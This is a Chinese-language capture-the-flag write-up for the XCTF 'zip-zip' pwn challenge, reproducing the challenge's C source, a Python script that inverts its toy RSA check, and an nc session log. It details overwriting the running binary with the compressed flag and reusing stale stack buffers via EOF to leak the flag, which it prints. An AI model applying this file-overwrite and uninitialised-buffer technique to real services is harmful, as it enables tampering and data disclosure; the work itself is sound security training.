# zip-zip

[题目地址](https://adworld.xctf.org.cn/challenges/details?hash=6f962254-7b8c-11ed-ab28-000c29bc20bf&task_category_id=2)

不懂什么原因，题目给的附件下载不下来。罢了，反正也是复现，直接去[wp](https://xia0ji233.pro/2023/01/01/Nepnep-CatCTF2022/#zip%F0%9F%92%BC)找来源代码。

```c
#include<stdio.h>
#include <math.h>
#include<unistd.h>
#include <sys/prctl.h>
#include <linux/filter.h>
#include <linux/seccomp.h>
#include <zlib.h>
//gcc -o zip zip.c -lz
int uid=1000;
int changdu;
int c[100];

//加密函数
void encrypt(int e,int n){       //自己指定指数e

    //先将符号明文转换成字母所对应的ascii码。
    char mingwen[100];    //符号明文
    printf("请输入CDK：\n");
    scanf("%10s",mingwen);
    getchar();
    changdu=strlen(mingwen);
    int ming[strlen(mingwen)];   //定义符号明文
    for(int i=0;i<strlen(mingwen);i++){
    ming[i]=mingwen[i];        //将字母转换成对应的ascii码。
    }
    printf("\n");
    //开始加密
    printf("start…………………………\n");
    int zhuan=1;    //c为加密后的数字密文
    for(int i=0;i<strlen(mingwen);i++){

       for(int j=0;j<e;j++){
        zhuan=zhuan*ming[i]%n;
        //zhuan=zhuan%n;
       }
       c[i]=zhuan;
       //printf("%d",mi[i]);
       zhuan=1;
    }
    if(c[0]!=149||c[1]!=108||c[2]!=24)//14910824
    {
        exit(0);
    }
    else
    {
        uid=0;
    }

}
int zip(void)
{
    FILE* file;
    uLong flen;
    unsigned char* fbuf = NULL;
    uLong clen;
    unsigned char* cbuf = NULL;


    char fileName[0x2560];
    puts("file");
    scanf("%2560s",fileName);
    getchar();

    if((file = fopen(fileName, "rb")) == NULL)
    {
        printf("Can\'t open %s!\n", fileName);
        return -1;
    }
    /* 装载源文件数据到缓冲区 */
    fseek(file, 0L, SEEK_END);    /* 跳到文件末尾 */
    flen = ftell(file);        /* 获取文件长度 */
    fseek(file, 0L, SEEK_SET); //回到文件开头
    if((fbuf = (unsigned char*)malloc(sizeof(unsigned char) * flen)) == NULL)
    {
        printf("No enough memory!\n");
        fclose(file);
        return -1;
    }
    fread(fbuf, sizeof(unsigned char), flen, file); //file文件内容读入fbuf
    /* 压缩数据 */
    clen = compressBound(flen); //计算压缩后的长度
    if((cbuf = (unsigned char*)malloc(sizeof(unsigned char) * clen)) == NULL)
    {
        printf("No enough memory!\n");
        fclose(file);
        return -1;
    }
    if(compress(cbuf, &clen, fbuf, flen) != Z_OK)
    {
        printf("Compress %s failed!\n", fileName);
        return -1;
    }
    fclose(file);

    puts("zip file");
    scanf("%2560s",fileName);
    getchar();
    if((file = fopen(fileName, "wb")) == NULL)
    {
        printf("Can\'t create %s!\n", fileName);
        return -1;
    }
    /* 保存压缩后的数据到目标文件 */
    fwrite(&flen, sizeof(uLong), 1, file);    /* 写入源文件长度 */
    fwrite(&clen, sizeof(uLong), 1, file);    /* 写入目标数据长度 */
    fwrite(cbuf, sizeof(unsigned char), clen, file);
    fclose(file);

    free(fbuf);
    free(cbuf);

    return 0;
}
int unzip(void)
{
    FILE* file;
    uLong flen;
    unsigned char* fbuf = NULL;
    uLong ulen;
    unsigned char* ubuf = NULL;

    char fileName[0x2560];
    puts("zip file");

    scanf("%1s",fileName);
    getchar();
    if((file = fopen(fileName, "rb")) == NULL)
    {
        printf("Can\'t open %s!\n", fileName);
        return -1;
    }
    /* 装载源文件数据到缓冲区 */
    fread(&ulen, sizeof(uLong), 1, file);   /* 获取缓冲区大小 */
    fread(&flen, sizeof(uLong), 1, file);   /* 获取数据流大小 */
    if((fbuf = (unsigned char*)malloc(sizeof(unsigned char) * flen)) == NULL)
    {
        printf("No enough memory!\n");
        fclose(file);
        return -1;
    }
    fread(fbuf, sizeof(unsigned char), flen, file);
    /* 解压缩数据 */
    if((ubuf = (unsigned char*)malloc(sizeof(unsigned char) * ulen)) == NULL)
    {
        printf("No enough memory!\n");
        fclose(file);
        return -1;
    }
    if(uncompress(ubuf, &ulen, fbuf, flen) != Z_OK)
    {
        printf("Uncompress %s failed!\n", fileName);
        return -1;
    }
    fclose(file);
    puts("unzip file");
    scanf("%1s",fileName);
    getchar();
    if((file = fopen(fileName, "wb")) == NULL)
    {
        printf("Can\'t create %s!\n", fileName);
        return -1;
    }
    /* 保存解压缩后的数据到目标文件 */
    fwrite(ubuf, sizeof(unsigned char), ulen, file);
    fclose(file);

    free(fbuf);
    free(ubuf);

    return 0;
}
void sandbox(){
    struct sock_filter filter[] = {
    BPF_STMT(BPF_LD+BPF_W+BPF_ABS,4),
    BPF_JUMP(BPF_JMP+BPF_JEQ,0xc000003e,0,2),
    BPF_STMT(BPF_LD+BPF_W+BPF_ABS,0),
    BPF_JUMP(BPF_JMP+BPF_JEQ,59,0,1),
    BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_KILL),
    BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_ALLOW),
    };
    struct sock_fprog prog = {
    .len = (unsigned short)(sizeof(filter)/sizeof(filter[0])),
    .filter = filter,
    };
    prctl(PR_SET_NO_NEW_PRIVS,1,0,0,0);
    prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&prog);
}
void init()
{
    sandbox();
    setbuf(stdout,0);
    setbuf(stdin,0);

}
void buy()
{
    encrypt(7,221);
}
void menu()
{
    puts("1.zip");
    puts("2.unzip");
    puts("3.buy root");
}


int main(int argc, char const *argv[])
{
    init();
    while(1)
    {
        menu();
        int choice;
        scanf("%d",&choice);
        getchar();
        switch(choice)
        {
            case 1:zip();break;
            case 2:
            if(uid==0)
            {
                unzip();
            }break;
            case 3:buy();break;
            default:exit(0);
        }
    }
    return 0;
}
```

本题涉及到zlib库的使用，主要是[compress和uncompress](https://blog.csdn.net/turingo/article/details/8148264)。这个程序的压缩和解压功能都是没有问题的（猜测来自这篇[文章](https://blog.csdn.net/turingo/article/details/8178510)），有问题的是程序逻辑。zip功能可以随便输入要压缩的文件和目标文件的文件名，如果我们输入等同于当前正在运行的程序的目标文件名会发生什么？答案显而易见，覆盖当前执行的程序,且同文件名覆盖不影响权限，不用担心权限问题。当时覆盖不会立刻出现问题，因为程序此时没有结束，而是挂载在proc目录下。然而下一次nc就会报错了。

思路如下：

1. zip文件，源文件flag，目标文件pwn（当前正在运行的程序名，应该在附件里）
2. unzip文件，源文件pwn，目标文件还是pwn。根据刚才zip的操作，pwn里面应该是flag，我们把这个解压出来的flag重命名为pwn，下一次nc时就会报错，把flag爆出来。

首先需要把unzip功能解锁。验证就是一个简单的rsa，直接贴代码。

```python
import gmpy2
def Decrypt(c,e,p,q):
  L=(p-1)*(q-1)
  d=gmpy2.invert(e,L)
  n=p*q
  m=gmpy2.powmod(c,d,n)
  flag=chr(m)
  print(flag)
if __name__ == '__main__':
  p =  17
  q =  13
  e =  7
  c =  149
  Decrypt(c,e,p,q)
  c=108
  Decrypt(c,e,p,q)
  c=24
  Decrypt(c,e,p,q)
```

得到CDK是HRP。离实施计划只有最后一个问题：unzip功能限制filename只能是1个字符。这里是一个小知识点：unzip和zip都被main所调用，并且使用的filename变量大小一致，利用子函数同栈内存大小相等的特点，在unzip的时候发送Ctrl+D(手动输入EOF)，程序就会结束输入，这样留在unzip的filename里的就是上次在zip输入的压缩后的文件名，也就是pwn。

```
$ nc 61.147.171.105 51389
1.zip
2.unzip
3.buy root
3
请输入CDK：
HRP

start…………………………
1.zip
2.unzip
3.buy root
1
file
flag
zip file
pwn
1.zip
2.unzip
3.buy root
2
zip file
^C
$ nc 61.147.171.105 51389
./pwn: 1: ./pwn: cyberpeace{7db8fa69e92fda113bbbaec947c669b0}: not found
```

## Flag
> cyberpeace{7db8fa69e92fda113bbbaec947c669b0}